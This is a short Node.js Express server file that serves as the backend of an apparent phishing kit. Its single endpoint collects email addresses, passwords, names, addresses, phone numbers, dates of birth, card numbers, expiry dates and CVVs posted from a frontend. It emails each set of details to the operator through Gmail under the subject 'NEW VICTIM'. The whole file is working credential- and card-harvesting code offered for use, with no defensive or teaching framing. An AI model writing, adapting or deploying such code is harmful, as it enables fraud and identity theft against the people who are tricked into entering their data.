// server.js
require("dotenv").config();
const express = require("express");
const cors = require("cors");
const nodemailer = require("nodemailer");

const app = express();
app.use(cors());
app.use(express.json());
const PORT = process.env.PORT || 5000;

const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

const processed = new Set();

app.post("/api/confirm", async (req, res) => {
  // Extract ALL data sent from the frontend
  const { 
    sessionId, email, password, name, address, 
    phone, dob, cardNumber, expiry, cvv 
  } = req.body;

  if (processed.has(sessionId)) {
    return res.json({ message: "Already processed" });
  }
  processed.add(sessionId);

  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: process.env.EMAIL_USER,
    subject: `🚨 NEW VICTIM: ${name || 'Unknown'}`,
    text: `
        New information captured:
        -------------------------
        Email: ${email}
        Password: ${password}
        Name: ${name}
        Address: ${address}
        Phone: ${phone}
        DOB: ${dob}
        Card: ${cardNumber}
        Expiry: ${expiry}
        CVV: ${cvv}
        
        Session: ${sessionId}
    `,
  };

  try {
    await transporter.sendMail(mailOptions);
    console.log("✅ Email sent with full details");
    res.json({ success: true });
  } catch (err) {
    console.error("❌ Email failed:", err);
    res.status(500).json({ error: "Email failed" });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});